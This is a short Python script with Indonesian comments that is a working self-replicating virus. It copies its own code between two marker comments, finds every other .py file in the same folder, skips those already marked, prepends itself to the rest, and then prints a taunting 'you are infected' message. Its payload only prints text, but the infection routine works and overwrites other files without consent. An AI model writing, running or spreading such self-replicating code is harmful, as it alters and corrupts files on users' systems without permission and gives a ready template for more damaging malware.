# VIRUS SAYS HI!
import sys
import glob

virus_code = []

# 1. Mengambil kode virus dari file ini sendiri
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

is_virus = False
for line in lines:
    # Menggunakan .strip() agar tidak error karena spasi/enter
    if line.strip() == "# VIRUS SAYS HI!":
        is_virus = True
    
    if is_virus:
        virus_code.append(line)
    
    if line.strip() == "# VIRUS SAYS BYE!":
        break

# 2. Mencari semua file Python di folder yang sama
# Ini akan mencari file seperti web02.py
target_files = glob.glob('*.py')

for file in target_files:
    # Jangan infeksi diri sendiri
    if file == sys.argv[0]:
        continue
    
    with open(file, 'r') as f:
        original_code = f.readlines()

    # Cek apakah file sudah terinfeksi
    is_infected = False
    for line in original_code:
        if "# VIRUS SAYS HI!" in line:
            is_infected = True
            break

    # 3. Jika belum terinfeksi, masukkan virus ke bagian ATAS file
    if not is_infected:
        new_content = []
        new_content.extend(virus_code) # Masukkan kode virus
        new_content.append('\n')       # Beri jarak 1 baris
        new_content.extend(original_code) # Masukkan kode asli file tersebut

        with open(file, 'w') as f:
            f.writelines(new_content)
        print(f"Suksess menginfeksi: {file}")

def malicious_code():
    print("ANDA TELAH TERINFEKSI HAHAHA !!!")

malicious_code()
# VIRUS SAYS BYE!